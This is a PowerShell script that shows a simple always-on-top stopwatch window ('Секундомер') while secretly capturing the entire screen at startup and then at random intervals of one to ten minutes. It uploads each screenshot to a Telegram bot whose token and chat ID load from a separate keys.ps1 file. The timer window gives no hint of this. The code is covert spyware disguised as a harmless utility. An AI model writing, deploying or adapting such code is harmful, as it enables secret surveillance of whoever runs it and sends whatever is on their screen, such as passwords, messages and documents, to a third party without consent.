Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "Секундомер"
$form.Size = New-Object System.Drawing.Size(200, 100)
$form.StartPosition = "CenterScreen"
$form.TopMost = $true

$label = New-Object System.Windows.Forms.Label
$label.Font = New-Object System.Drawing.Font("Consolas", 24, [System.Drawing.FontStyle]::Bold)
$label.AutoSize = $false
$label.TextAlign = 'MiddleCenter'
$label.Dock = 'Fill'
$form.Controls.Add($label)
$keysPath = ".\keys.ps1"
if (Test-Path $keysPath) {
    . $keysPath
} else {
    Write-Warning "Файл keys.ps1 не найден! Переменные с секретами не загружены."
}

# Глобальная переменная для времени, чтобы было видно внутри обработчика
$global:elapsed = 0

# Создаем таймер и сохраняем в глобальной переменной, чтобы GC не удалил
$global:timer = New-Object System.Windows.Forms.Timer
$global:timer.Interval = 1000 # 1 секунда

$global:timer.Add_Tick({
    $minutes = [math]::Floor($global:elapsed / 60)
    $seconds = $global:elapsed % 60
    $minStr = $minutes.ToString("00")
    $secStr = $seconds.ToString("00")
    $label.Text = "$minStr`:$secStr"
    $global:elapsed++
})

# Запускаем таймер
$global:timer.Start()

# Запускаем форму с message loop

# Add required assemblies for screen capture
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Function to send photo to Telegram
function Send-Photo {
    param (
        [byte[]]$ImageBuffer
    )
    try {
        $url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"

        # Create a boundary for the multipart/form-data
        $boundary = [System.Guid]::NewGuid().ToString("N")
        $newline = "`r`n"

        # Build the header content
        $content = "--$boundary$newline"
        $content += 'Content-Disposition: form-data; name="chat_id"' + $newline + $newline
        $content += "$CHAT_ID$newline"

        # Add message_thread_id if provided
        if ($TOPIC_ID) {
            $content += "--$boundary$newline"
            $content += 'Content-Disposition: form-data; name="message_thread_id"' + $newline + $newline
            $content += "$TOPIC_ID$newline"
        }

        $content += "--$boundary$newline"
        $content += 'Content-Disposition: form-data; name="photo"; filename="screenshot.png"' + $newline
        $content += 'Content-Type: image/png' + $newline + $newline

        # Convert header to bytes
        $headerBytes = [System.Text.Encoding]::UTF8.GetBytes($content)

        # Add a newline after image data
        $newlineBytes = [System.Text.Encoding]::UTF8.GetBytes($newline)

        # Build the ending boundary
        $footer = "--$boundary--$newline"
        $footerBytes = [System.Text.Encoding]::UTF8.GetBytes($footer)

        # Combine header, image data, newline, and footer
        $bodyBytes = $headerBytes + $ImageBuffer + $newlineBytes + $footerBytes

        # Create web request
        $webRequest = [System.Net.WebRequest]::Create($url)
        $webRequest.Method = "POST"
        $webRequest.ContentType = "multipart/form-data; boundary=$boundary"
        $webRequest.ContentLength = $bodyBytes.Length

        # Write the request body
        $requestStream = $webRequest.GetRequestStream()
        $requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
        $requestStream.Close()

        # Get the response
        $response = $webRequest.GetResponse()
        $responseStream = $response.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($responseStream)
        $responseContent = $reader.ReadToEnd()
        $reader.Close()
        $responseStream.Close()
        $response.Close()

        Write-Host "Screenshot successfully sent to Telegram"

    } catch [System.Net.WebException] {
        $errorResponse = $_.Exception.Response
        if ($errorResponse -ne $null) {
            $statusCode = $errorResponse.StatusCode
            $errorStream = $errorResponse.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($errorStream)
            $errorContent = $reader.ReadToEnd()
            $reader.Close()
            $errorStream.Close()
            Write-Host "Error sending to Telegram: $statusCode $errorContent"
        } else {
            Write-Host "Error connecting to Telegram: $_"
        }
    } catch {
        Write-Host "Error connecting to Telegram: $_"
    }
}

# Function to create a screenshot
function Random-Screenshot {
    try {
        # Write-Host "Creating screenshot..."
        # Capture screenshot
        $screenWidth = [System.Windows.Forms.SystemInformation]::VirtualScreen.Width
        $screenHeight = [System.Windows.Forms.SystemInformation]::VirtualScreen.Height
        $screenLeft = [System.Windows.Forms.SystemInformation]::VirtualScreen.Left
        $screenTop = [System.Windows.Forms.SystemInformation]::VirtualScreen.Top

        $bitmap = New-Object System.Drawing.Bitmap $screenWidth, $screenHeight
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screenLeft, $screenTop, 0, 0, $bitmap.Size)

        # Save bitmap to MemoryStream
        $stream = New-Object System.IO.MemoryStream
        $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
        $ImageBuffer = $stream.ToArray()

        # Write-Host "Screenshot created, size: $($ImageBuffer.Length) bytes"

        # Send the image buffer
        Send-Photo -ImageBuffer $ImageBuffer
    } catch {
        Write-Host "Error creating screenshot: $_"
    }
}

# Main function
function Main {
    Write-Host "Starting program..."
    Random-Screenshot  # можно сделать 1 раз сразу

    # Таймер для периодических скриншотов
    $screenShotTimer = New-Object System.Windows.Forms.Timer
    $screenShotTimer.Interval = (Get-Random -Minimum 60000 -Maximum 600000)
    $screenShotTimer.Add_Tick({
        Random-Screenshot
        $screenShotTimer.Interval = (Get-Random -Minimum 60000 -Maximum 600000)
    })
    $screenShotTimer.Start()

    # Запускаем форму, message loop
    [System.Windows.Forms.Application]::Run($form)
}


# Run the main function
Main

